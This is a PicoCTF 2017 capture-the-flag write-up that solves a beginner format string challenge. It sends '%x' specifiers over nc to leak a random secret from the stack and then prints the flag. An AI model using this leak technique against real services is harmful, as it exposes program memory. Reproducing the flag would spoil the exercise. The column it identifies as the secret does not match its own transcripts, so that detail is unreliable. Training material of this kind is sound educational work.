# PicoCTF_2017: I've got a Secret

**Category:** Binary Exploitation
**Points:** 75
**Description:**

>Hopefully you can find the right format for my [secret](secret.c)! Source. Connect on shell2017.picoctf.com:39169.

**Hint:**

>This is a beginning format string attack.

## Write-up
A classic format string attack, which means passing the conversion string in the input field to get the memory address of the stack.

By running the code for the first time, we come to know that the secret is in hex format, so `%x` can be used to attack this code.

    $ nc shell2017.picoctf.com 39169
	Give me something to say!
	%x %x %x %x %x %x %x %x
	40 f7fc7c20 8048792 1 ffffdd34 4ef971b5 3 f7fc73c4
	Now tell my secret in hex! Secret: f7fc7c20
    As my friend says,"You get nothing! You lose! Good day, Sir!"

With the same input `%x %x %x %x %x %x %x %x` run the program for some times to see that the 5th column generates a new value everytime. That's because of the urandom in the program and we can decide that this should be the required secret hex value.

    $ nc shell2017.picoctf.com 39169
	Give me something to say!
	%x %x %x %x %x %x %x %x
	40 f7fc7c20 8048792 1 ffffdd34 4ef971b5 3 f7fc73c4
	Now tell my secret in hex! Secret: 4ef971b5
	c9fd8f8a1dcaee8962bc60cb516a79a5
	Wow, you got it!

Therefore, the flag is `c9fd8f8a1dcaee8962bc60cb516a79a5`.
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTE2NDkxMDM3NTZdfQ==
-->